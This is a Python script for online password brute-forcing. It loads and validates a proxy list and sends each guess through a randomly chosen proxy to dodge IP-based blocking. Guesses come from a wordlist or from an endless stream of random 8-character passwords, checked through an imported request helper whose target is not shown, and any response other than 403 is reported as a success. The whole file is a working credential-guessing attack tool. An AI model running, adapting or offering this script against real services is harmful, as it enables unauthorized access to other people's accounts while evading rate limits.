from sngol import make_request
from proxy import is_bad_proxy, validate_proxy_list, read_proxy_file
from passgen import PassGen
import random
import string

using_proxies = True
print("Reading your proxy list... ", end="")
try:
    proxy_list = read_proxy_file("./proxylist.txt")
except Exception as e:
    print("Error! Missing file. Add your proxies to the new .txt in this directory called \"proxylist.txt\", and run the script again.")
    print(e)
    a = open("./proxylist.txt", "w+")
    a.close()
    exit()
    
print(proxy_list)
if (len(proxy_list) == 0):
    print("No proxies in proxy list! Add a few or use your computer's IP.")
    i = input("Do you wish to continue without proxies? (Y/N): ")
    if i == "Y":
        using_proxies = False
    else:
        exit()
else:
    print(f"Loaded {len(proxy_list)}  {'proxy' if len(proxy_list) == 1 else 'proxies'}!")
    print("Validating... ")
    proxy_list = validate_proxy_list(proxy_list)
    if len(proxy_list) == 0:
        print("None of the proxies are valid!")
        i = input("Do you wish to continue without proxies? (Y/N): ")
        if i == "Y":
            using_proxies = False
        else:
            exit()
    else:
        print(f"{len(proxy_list)} {'proxy' if len(proxy_list) == 1 else 'proxies'} are ready to use!")

def check_pass(password, proxy):
    print(f"Checking password {password} with {proxy}...")
    try:
        response = make_request(password, proxy)
            
        if response.status_code != 403:
            print(f"Success!!  | {response.text}")
        else:
            print(f"Failure :( | {response.text}")

        return response
    except Exception as e:
        print(f"Something bad happened... {e}")
        exit()

passgenerator = PassGen(8)
wordlist = passgenerator.wordlist

if wordlist:
    for password in wordlist:
        proxy = random.choice(proxy_list)
        
        check_pass(password, proxy)
else:
    while True:
        password = passgenerator.generate_password()
        proxy = random.choice(proxy_list)
        
        check_pass(password, proxy)
